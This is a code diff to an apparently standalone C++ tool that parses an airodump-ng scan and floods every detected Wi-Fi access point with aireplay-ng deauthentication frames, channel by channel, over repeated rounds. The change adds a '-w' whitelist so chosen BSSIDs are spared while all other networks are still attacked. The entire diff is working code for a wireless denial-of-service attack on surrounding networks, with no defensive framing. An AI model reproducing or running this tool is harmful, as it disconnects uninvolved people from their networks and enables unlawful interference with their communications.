@@ -24,7 +24,7 @@ std::string current_time();
 
 int main(int argc, const char* argv[]){
 
-    string airodump_csv, interface = "";
+    string airodump_csv, interface, whitelist = "";
     int iterations = 0;
 
     bool toggle_flag = true;
@@ -41,6 +41,8 @@ int main(int argc, const char* argv[]){
                 airodump_csv = param;
             }else if( option == "-t" ){
                 iterations = stoi( param );
+            }else if( option == "-w" ){
+                whitelist = param;
             }
             toggle_flag = true;
         }
@@ -54,6 +56,11 @@ int main(int argc, const char* argv[]){
 
     vector < wireless_network > w_networks;
     vector < int > channels;
+    vector < string > bssid_white_list;
+
+    if( whitelist != "" ){
+        bssid_white_list = split( trim( whitelist ), ',' );
+    }
 
     string line;
     ifstream file;
@@ -96,14 +103,22 @@ int main(int argc, const char* argv[]){
             command = "";
             for( int k = 0; k < w_networks.size(); k++ ){
                 if( w_networks[ k ].channel ==  channels[j] ){
-                    cout    
-                        << current_time() << " Sending DeAuth " 
-                        << to_string(i+1) + "/" + to_string(iterations)
-                        << " - BSSID: ["  
-                        << w_networks[ k ].bssid << "] - C: " 
-                        << w_networks[ k ].channel << 
-                    endl;
-                    command += "aireplay-ng -0 4 -a " + w_networks[ k ].bssid + " " + interface + " > /dev/null & ";
+                    bool skip = false;
+                    for(int l = 0; l < bssid_white_list.size(); l++){
+                        if( bssid_white_list[l] == w_networks[ k ].bssid ){
+                            skip = true;
+                        }
+                    }
+                    if(!skip){
+                        cout    
+                            << current_time() << " Sending DeAuth " 
+                            << to_string(i+1) + "/" + to_string(iterations)
+                            << " - BSSID: ["  
+                            << w_networks[ k ].bssid << "] - C: " 
+                            << w_networks[ k ].channel << 
+                        endl;
+                        command += "aireplay-ng -0 4 -a " + w_networks[ k ].bssid + " " + interface + " > /dev/null & ";
+                    }
                 }
             }
             command += "wait" ;
